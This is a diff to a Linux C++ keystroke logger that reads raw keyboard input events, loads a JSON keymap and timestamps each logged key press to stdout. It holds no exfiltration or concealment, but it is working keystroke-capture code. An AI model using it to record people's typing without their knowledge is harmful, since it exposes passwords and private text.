@@ -1,17 +1,20 @@
 // logger.cpp
 
 #include "logger.h"
-#include "keymap.h"
 
 #include <linux/input-event-codes.h>
+#include <nlohmann/json.hpp>
 #include <sys/stat.h>
 #include <sys/types.h>
 
 #include <cstring>
+#include <ctime>
 #include <fcntl.h>
 #include <filesystem>
+#include <fstream>
 #include <iostream>
 #include <unistd.h>
+#include <utility>
 
 Logger& Logger::get_instance() {
 	static Logger instance;
@@ -22,7 +25,7 @@ Logger::Logger()
 : fd_(-1)
 , initialized_(false)
 , running_(false)
-, keymap_({keymap_init}) {
+, keymap_(load_keymap("keymap.json")) {
 	return;
 }
 
@@ -85,6 +88,28 @@ auto Logger::kill() -> void {
 	ev_init_.clear();
 }
 
+auto Logger::
+  load_keymap(const std::string& config) -> std::unordered_map<unsigned int, std::pair<std::string, std::string>> {
+	std::unordered_map<unsigned int, std::pair<std::string, std::string>> tmp;
+	std::ifstream                                                         conf(config);
+
+	if (!conf.is_open()) {
+		std::cerr << "logger (constructor): keymap config error" << std::endl;
+	}
+
+	nlohmann::json keyconfig;
+	conf >> keyconfig;
+
+	for (auto& [key, val] : keyconfig.items()) {
+		auto code = std::stoi(key);
+		auto name = std::string{val[0]};
+		auto ch   = std::string{val[1]};
+		tmp.emplace(code, std::make_pair(name, ch));
+	}
+
+	return tmp;
+}
+
 template<class _Rep, class _Period>
 auto async_timer(std::chrono::duration<_Rep, _Period> duration, std::function<void()> callback) -> std::future<void> {
 	return std::async(std::launch::async, [duration, callback]() {
@@ -102,6 +127,16 @@ auto Logger::fd_monitor(signed int fd, fd_set fds) -> signed int {
 	FD_SET(fd, &fds);
 
 	return select(fd + 1, &fds, nullptr, nullptr, &timeout);
+}
+
+auto Logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
+	char date[11], time[13];
+
+	std::tm* tv = std::localtime(&tv_sec);
+	std::strftime(date, sizeof(date), "%Y-%m-%d", tv);
+	std::strftime(time, sizeof(time), "%H:%M:%S", tv);
+
+	return std::make_pair(std::string{date}, std::string{time});
 }
 
 auto Logger::find_kbd() -> std::string {
@@ -148,8 +183,6 @@ auto Logger::find_kbd() -> std::string {
 				}
 
 				if (FD_ISSET(fd, &fds)) {
-					// If select returns and the fd is set, read the event
-					// change to send struct to datastore
 					input_event ev;
 					ssize_t     n = read(fd, &ev, sizeof(ev));
 
@@ -175,16 +208,19 @@ auto Logger::find_kbd() -> std::string {
 }
 
 auto Logger::ev_reader() -> void {
-	struct input_event ev;
-	ssize_t            n;
+	struct input_event                  ev;
+	ssize_t                             n;
+	std::pair<std::string, std::string> dtg;
 
 	while (running_) {
 		n = read(fd_, &ev, sizeof(ev));
 		if (n == (ssize_t)sizeof(ev)) {
 			if (ev.type == EV_KEY) {
 				std::string key_name = get_keychar(ev.code);
+				dtg                  = datetime(ev.time.tv_sec);
 				std::cout
-				  << "logger (ev): " << key_name << " (" << ev.code << ") " << (ev.value ? "pressed" : "released") << std::endl;
+				  << dtg.first << " " << dtg.second << " logger (ev): " << key_name << " (" << ev.code << ") "
+				  << (ev.value ? "pressed" : "released") << std::endl;
 			}
 		}
 		else if (n == -1) {
